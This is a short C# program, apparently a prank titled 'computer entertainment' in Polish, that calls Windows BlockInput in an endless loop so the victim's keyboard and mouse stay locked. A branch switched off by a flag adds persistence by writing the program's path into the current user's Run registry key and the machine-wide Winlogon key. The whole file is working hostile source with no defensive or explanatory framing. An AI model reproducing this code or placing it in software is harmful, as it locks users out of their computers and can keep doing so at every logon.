using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using Microsoft.Win32;
using System.Runtime.InteropServices;
using System.IO;
using System.Diagnostics;

namespace KomputerowaRozrywka_1._1
{
    class Program
    {
        [return: MarshalAs(UnmanagedType.Bool)]
        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
        public static extern bool BlockInput([In, MarshalAs(UnmanagedType.Bool)] bool fBlockIt);
        
        static void Main(string[] args)
        {
            bool hard = false;
            if (hard)
            {
                string quot = "\"";
                string path = Process.GetCurrentProcess().MainModule.FileName;
                string param = " /nosplash /minimized";
                string value = quot + path + quot + param;
                //np. "C:\Users\Grzegorz\Desktop\KomRoz1.1.exe" /nosplash /minimized

                RegistryKey keyCU = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
                RegistryKey keyLM = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", true);

                keyCU.SetValue("hello", value, RegistryValueKind.String);
                keyLM.SetValue("hello", value, RegistryValueKind.String);

                keyCU.Flush();
                keyLM.Flush();

                keyCU.Close();
                keyLM.Close();
            }
            while(true)
                BlockInput(true);
        }
    }
}
